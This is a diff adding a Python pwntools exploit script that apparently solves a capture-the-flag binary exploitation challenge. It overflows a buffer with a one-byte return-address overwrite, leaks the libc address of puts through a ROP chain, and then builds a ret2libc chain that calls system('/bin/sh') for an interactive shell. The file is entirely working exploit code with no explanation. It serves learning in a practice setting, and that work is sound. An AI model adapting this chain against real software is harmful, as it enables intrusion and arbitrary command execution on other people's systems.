@@ -1,0 +1,47 @@
+from pwn import *
+
+# overwrite 1 byte to jump to *main + 84, then overwrite more to jump to_the_moon func then ret2libc
+
+p = process("./chall_patched")
+'''
+p = gdb.debug("./chall_patched", gdbscript = 
+break *find_the_bunny + 51
+break *to_the_moon + 5
+break *to_the_moon + 58
+break *to_the_moon + 63
+r
+)
+'''
+e = ELF("./chall_patched")
+libc = ELF("./libc.so.6")
+
+pop_rdi = 0x00000000004012d3
+ret = pop_rdi + 1
+
+payload = b"A" * 0x30 + b"B" * 8 + p8(0x42)
+p.sendafter(b"1 byte.\n", payload)
+
+to_the_moon_addr = e.symbols['to_the_moon'] + 5
+payload = p64(to_the_moon_addr)
+p.sendafter(b"more!\n", payload)
+
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+payload = b"A" * 0x30 + b"B" * 8
+payload += p64(pop_rdi) + p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(to_the_moon_addr - 5)
+p.sendafter(b"potions.\n", payload)
+
+libc_base = u64(p.recv(6) + b'\x00' * 2) - 527952
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search("/bin/sh"))[0]
+print(hex(libc_base))
+
+payload = b"A" * 0x30 + b"B" * 8
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(ret)
+payload += p64(system)
+p.sendafter(b"potions.\n", payload)
+
+p.interactive()
